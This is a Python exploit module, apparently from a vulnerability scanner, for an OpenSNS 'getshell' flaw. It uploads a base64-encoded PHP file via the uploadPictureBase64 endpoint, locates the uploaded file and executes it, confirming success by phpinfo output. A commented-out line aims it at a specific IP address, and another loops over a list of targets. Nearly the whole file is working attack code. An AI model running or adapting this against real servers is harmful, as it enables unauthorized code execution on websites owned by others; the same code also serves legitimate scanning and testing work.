#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: opensns index.php 前台getshell
referer: unknown
author: Lucifer
description: 文件index.php中,参数data base64解码getshell。
'''

import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload = "/index.php?s=/Core/File/uploadPictureBase64.html"
post_data = {
    "data": "data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp2
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
            pos = resp.text.find("http:")
            shellurl = resp.text[pos::].replace("\\", "").strip('"}')
            resp2 = requests.get(shellurl, headers=headers, timeout=10,proxies=proxies, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
            pos = resp.text.find("http:")
            shellurl = resp.text[pos::].replace("\\", "").strip('"}')
            resp2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
        con = resp2.text

        if  con.lower().find('configuration file (php.ini) path')!=-1:
            Medusa = "{} 存在opensns index.php 前台getshell漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass
#if __name__ == '__main__':
    # with open('1.txt', 'r') as f:
    #     for ip in f.readlines():
    #         ip = ip.strip()
    #         audit(assign('WWW', str(ip))[1])
    #medusa('54.37.131.33:8888',"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",'')